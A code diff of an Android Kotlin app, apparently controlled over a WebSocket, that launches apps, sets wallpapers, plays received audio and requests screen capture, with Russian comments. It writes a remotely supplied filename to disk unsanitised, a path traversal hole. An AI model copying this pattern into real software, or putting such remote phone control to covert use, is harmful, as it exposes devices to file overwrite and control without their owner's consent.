@@ -147,7 +147,7 @@ class MainActivity : Activity() {
     private fun launchApp(ws: WebSocket, packageName: String) {
         try {
             val intent = packageManager.getLaunchIntentForPackage(packageName)
-            if (intent != null) startActivity(intent) else sendError(ws, "Приложение $packageName не найдено или нет прав")
+            if (intent != null) startActivity(intent) else sendError(ws, "Приложение $packageName не найдено")
         } catch (e: Exception) { sendError(ws, "Ошибка запуска: ${e.message}") }
     }
 
@@ -155,19 +155,47 @@ class MainActivity : Activity() {
         try {
             val bytes = Base64.decode(base64Str, Base64.DEFAULT)
             val bitmap = BitmapFactory.decodeByteArray(bytes, 0, bytes.size)
-            WallpaperManager.getInstance(this).setBitmap(bitmap)
+            
+            if (bitmap == null) {
+                sendError(ws, "Картинка битая или формат не поддерживается")
+                return
+            }
+            
+            // Сжимаем картинку, чтобы телефон не охуел
+            val scaledBitmap = Bitmap.createScaledBitmap(bitmap, 1080, 1920, true)
+            WallpaperManager.getInstance(this).setBitmap(scaledBitmap)
+            
             runOnUiThread { statusText?.text = "Обои изменены" }
-        } catch (e: Exception) { sendError(ws, "Ошибка обоев: ${e.message}") }
+            ws.send(JSONObject().apply { put("type", "response"); put("msg", "Обои успешно поставлены!") }.toString())
+        } catch (e: Exception) {
+            sendError(ws, "Ошибка обоев: ${e.message}")
+        }
     }
 
     private fun playFile(ws: WebSocket, base64Data: String, filename: String) {
         try {
             val audioData = Base64.decode(base64Data, Base64.DEFAULT)
-            val file = File(getExternalFilesDir(null), filename)
+            
+            // Сохраняем во временную папку кэша
+            val file = File(cacheDir, filename)
             file.writeBytes(audioData)
-            MediaPlayer().apply { setDataSource(file.absolutePath); prepare(); start() }
+            
+            if (!file.exists()) {
+                sendError(ws, "Файл не сохранился: $filename")
+                return
+            }
+
+            val player = MediaPlayer()
+            player.setDataSource(file.absolutePath)
+            player.prepare()
+            player.start()
+            
             runOnUiThread { statusText?.text = "Играет: $filename" }
-        } catch (e: Exception) { sendError(ws, "Ошибка аудио: ${e.message}") }
+            ws.send(JSONObject().apply { put("type", "response"); put("msg", "Аудио играет: $filename") }.toString())
+            
+        } catch (e: Exception) {
+            sendError(ws, "Ошибка аудио: ${e.message}")
+        }
     }
 
     private fun requestScreenCapture() {
